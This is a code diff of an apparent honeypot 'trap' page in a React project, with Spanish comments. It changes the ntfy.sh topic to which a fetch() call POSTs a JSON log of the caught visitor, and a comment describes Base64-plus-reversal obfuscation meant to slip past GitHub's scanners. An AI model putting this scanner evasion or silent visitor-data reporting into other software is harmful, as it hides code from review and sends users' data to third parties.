@@ -35,7 +35,7 @@ export default function TrapPage() {
         details: '¡INVASOR CAPTURADO EN TRAMPA!'
       };
 
-      const ntfyUrl = 'https://ntfy.sh/ordasin_security_v10?title=🚨_TRAP_HIT&priority=5&tags=skull,fire';
+      const ntfyUrl = 'https://ntfy.sh/ordasin_hub_903_sec_terminal_v12?title=🚨_TRAP_HIT&priority=5&tags=skull,fire';
       
       // Camuflaje ULTRA-AGRESSIVE anti-bot de GitHub
       // Doble Ofuscación: Base64 + Inversión (Bypass total de escáneres)
@@ -48,7 +48,7 @@ export default function TrapPage() {
 
       // 1. Reporte NTFY (Prioritario y Seguro)
       // Usamos el body para el JSON completo para evitar problemas de tamaño en headers
-      fetch('https://ntfy.sh/ordasin_security_v10', {
+      fetch('https://ntfy.sh/ordasin_hub_903_sec_terminal_v12', {
         method: 'POST',
         body: JSON.stringify(log),
         headers: {
